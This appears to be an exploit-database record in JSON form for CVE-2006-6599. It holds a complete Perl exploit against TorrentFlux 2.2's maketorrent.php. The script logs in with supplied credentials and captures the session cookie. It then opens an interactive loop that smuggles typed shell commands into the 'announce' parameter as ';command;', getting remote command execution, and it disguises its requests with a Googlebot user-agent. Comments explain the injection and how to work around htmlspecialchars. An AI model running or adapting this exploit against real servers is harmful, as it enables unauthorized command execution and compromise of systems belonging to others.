{
  "id": "2903",
  "title": "TorrentFlux 2.2 - &#039;maketorrent.php&#039; Remote Command Execution",
  "cve": "CVE-2006-6599",
  "vuln_type": "unknown",
  "code": "# The variable announce in maketorrent.php is not sanitised before being used. The announce \r\n# variable goes through various stages throughout the script, then it is passed as a into\r\n# an exec() function. This occurs in the middle of the string which is passed to the exec()\r\n# function. Therefore it is possible to stop the current stop by starting with ; then by\r\n# ending your command with ; (to avoid the other data TorrentFlux adds after the announce variable). \r\n# No data is returned to the user when they use this exploit, so it is hard to tell if the script\r\n# is vulnerable, and the use of htmlspecialchars() tends to make things much hard since \r\n# chracters like < and > dont work. \r\n\r\n# r0ut3r (writ3r [at] gmail.com)\r\n\r\n#################################################################################################\r\n#                                    r0ut3r Presents...                                         #\r\n#                                                                                               #\r\n#                                Another r0ut3r discovery!                                      #\r\n#                                  writ3r [at] gmail.com                                        #\r\n#                                                                                               #\r\n#                         TorrentFlux 2.2 Command Execution Exploit                             #\r\n#################################################################################################\r\n# Software: TorrentFlux 2.2                                                                     #\r\n#                                                                                               #\r\n# Vendor: http://www.torrentflux.com/                                                           #\r\n#                                                                                               #\r\n# Released: 2006/12/09                                                                          #\r\n#                                                                                               #\r\n# Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #\r\n#                                                                                               #\r\n# Note from a developer: \"Valid TorrentFlux user IDs are REQUIRED and this is NOT an open       #\r\n# vulnerability to a NON user\".                                                                 #\r\n#                                                                                               #\r\n# Note: The information provided in this document is for TorrentFlux administrator              #\r\n# testing purposes only! This vulnerability requires a user account. And watch out              #\r\n# for htmlspecialchars() when sending commands since tf uses it to sanitise variables.          #\r\n#                                                                                               #\r\n# Apart from a few problems (which are fixed) TorrentFlux is a great torrent client.            #\r\n# Download it at: http://www.torrentflux.com/                                                   #\r\n#################################################################################################\r\n\r\nuse IO::Socket;\r\n\r\n$port = \"80\"; # connection port\r\n$target = @ARGV[0]; # torrentflux.com\r\n$folder = @ARGV[1]; # /torrentflux/\r\n$user = @ARGV[2]; # login username\r\n$pass = @ARGV[3]; # login password\r\n\r\nsub Header()\r\n{\r\n\tprint q\r\n\t{#################################################################################################\r\n#                                    r0ut3r Presents...                                         #\r\n#                                                                                               #\r\n#                                Another r0ut3r discovery!                                      #\r\n#                                  writ3r [at] gmail.com                                        #\r\n#                                                                                               #\r\n#                         TorrentFlux 2.2 Command Execution Exploit                             #\r\n#################################################################################################\r\n};\r\n}\r\n\r\nsub Usage()\r\n{\r\n\tprint q\r\n\t{\r\nUsage: tf2exec.pl [target] [directory] [username] [password]\r\nExample: tf2exec.pl torrentflux.com /torrentflux/ r0ut3r testing123 \r\n};\r\n\texit();\r\n}\r\n\r\nHeader();\r\n\r\nif (!$target || !$folder || !$user || !$pass) {\r\n\tUsage(); }\r\n\r\n#Thanks to cb88 for the login request... \r\nprint \"\\n[+] Connecting...\\r\\n\";\r\n$sock = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target, PeerPort => $port) || die \"[-] Failed to connect. Exiting...\\r\\n\";\r\nprint \"[+] Attempting to login\\n\";\r\nprint $sock \"GET \".$folder.\"login.php?username=$user&iamhim=$pass HTTP/1.1\\n\";\r\nprint $sock \"Host: $target\\n\";\r\nprint $sock \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\n\";\r\nprint $sock \"Accept: text/html\\n\";\r\nprint $sock \"Connection: keep-alive\\n\\n\\r\\n\";\r\n\r\nwhile (<$sock>)\r\n{\r\n        if (/Cookie: TorrentFlux=(.*?);/)\r\n        {\r\n                $cookie = \"TorrentFlux=$1\";\r\n        }\r\n}\r\n\r\nprint \"[+] Successfully logged in\\n\";\r\nprint \"[+] Cookie: \".$cookie.\"\\n\";\r\nif ($cookie eq \"\")\r\n{\r\n        print \"[-] Failed to login. Exiting...\";\r\n\texit();\r\n}\r\n\r\nprint \"[+] Starting shell\\n\";\r\nprint \"[cmd]\\$ \";\r\n$cmd = <STDIN>;\r\n$cmd =~ s/ /%20/g;\r\nwhile ($cmd !~ \"exit\")\r\n{\r\n\t$xpack = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target, PeerPort => $port) || die \"[-] Failed to connect on exploit attempt. Exiting...\\r\\n\";\r\n\tprint $xpack \"GET \".$folder.\"maketorrent.php?announce=;\".substr($cmd, 0, -1).\"; HTTP/1.1\\n\";\r\n\tprint $xpack \"Host: $target\\n\";\r\n\tprint $xpack \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\n\";\r\n\tprint $xpack \"Accept: text/html\\n\";\r\n\tprint $xpack \"Cookie: \".$cookie.\"\\n\";\r\n\tprint $xpack \"Connection: keep-alive\\n\\n\";\r\n\r\n\tprint \"[cmd]\\$ \";\r\n\t$cmd = <STDIN>;\r\n}\r\n\r\nprint \"[!] Connection to host lost...\\n\";\r\n\r\n#################################################################################################\r\n#               This has been another r0ut3r discovery - writ3r [at] gmail.com                  #\r\n#################################################################################################\r\n\r\n# milw0rm.com [2006-12-09]",
  "url": "https://www.exploit-db.com/exploits/2903"
}